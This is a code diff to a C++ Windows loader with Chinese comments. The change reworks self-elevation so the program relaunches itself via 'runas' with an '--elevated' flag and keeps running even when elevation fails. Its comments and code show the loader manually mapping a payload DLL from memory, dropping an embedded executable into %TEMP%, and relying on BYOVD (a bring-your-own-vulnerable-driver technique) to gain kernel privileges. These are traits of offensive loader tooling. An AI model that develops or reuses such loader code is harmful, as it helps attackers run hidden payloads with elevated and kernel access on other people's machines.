@@ -21,38 +21,30 @@
 #include <string>
 #include "embedded_basic_loader.h"  // v3.32: 嵌入基础.exe
 
-// v3.37: 确保管理员权限 — 检测当前是否以管理员运行,
-// 否则通过 ShellExecute runas 重新启动
-static bool EnsureAdminPrivileges() {
-    BOOL isAdmin = FALSE;
-    HANDLE hToken = NULL;
-
-    // 方法: 检查 Token 中的 Administrators SID
-    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
-        TOKEN_ELEVATION elevation;
-        DWORD cbSize = sizeof(TOKEN_ELEVATION);
-        if (GetTokenInformation(hToken, TokenElevation, &elevation, cbSize, &cbSize)) {
-            isAdmin = elevation.TokenIsElevated;
-        }
-        CloseHandle(hToken);
+// v3.37: 确保管理员权限
+// 首次运行时无 --elevated 标记 → 通过 ShellExecute runas 重新启动自身
+// 重启后带 --elevated 标记 → 直接继续, 避免无限循环
+static void EnsureAdminPrivileges() {
+    // 检测命令行中是否已有 --elevated 标记 (防止无限重启动)
+    LPWSTR cmdLine = GetCommandLineW();
+    if (wcsstr(cmdLine, L"--elevated")) {
+        return; // 已经是第二次启动, 直接继续
     }
 
-    if (isAdmin) return true;
-
-    // 非管理员: 用 runas 重新启动
     wchar_t exePath[MAX_PATH];
     GetModuleFileNameW(NULL, exePath, MAX_PATH);
 
     SHELLEXECUTEINFOW sei = { sizeof(sei) };
-    sei.lpVerb = L"runas";
-    sei.lpFile = exePath;
-    sei.nShow  = SW_SHOW;
-    sei.fMask  = SEE_MASK_NOASYNC;
+    sei.lpVerb       = L"runas";
+    sei.lpFile       = exePath;
+    sei.lpParameters = L"--elevated";
+    sei.nShow        = SW_SHOWNORMAL;
 
     if (ShellExecuteExW(&sei)) {
-        ExitProcess(0);  // 原进程退出, 新进程以管理员身份运行
+        ExitProcess(0);  // UAC 弹窗→用户同意→新管理员进程启动→旧进程退出
     }
-    return false;  // 用户拒绝了 UAC 弹窗
+    // 如果 ShellExecuteEx 失败 (UAC 禁用 / 已管理员),
+    // 继续执行 — 由 payload.dll 内部的 BYOVD 进一步判断权限
 }
 
 // ============================================================
@@ -396,12 +388,8 @@ static MinimalMapResult MinimalManualMap(const uint8_t* dllData, size_t dllSize)
 // ============================================================
 
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
-    // v3.37: 强制管理员权限 — 非管理员则弹出 UAC 重新启动
-    if (!EnsureAdminPrivileges()) {
-        MessageBoxW(NULL, L"Loader 需要管理员权限才能运行 (BYOVD 内核防御需要)。\n\n请同意 UAC 弹窗，或右键 → 以管理员身份运行。",
-            L"权限不足", MB_OK | MB_ICONWARNING);
-        return 1;
-    }
+    // v3.37: 强制管理员权限 — 自动以 runas + --elevated 重新启动
+    EnsureAdminPrivileges();
 
     // v3.37: 释放嵌入的基础.exe 到 %TEMP% (供 payload.dll 启动)
     {
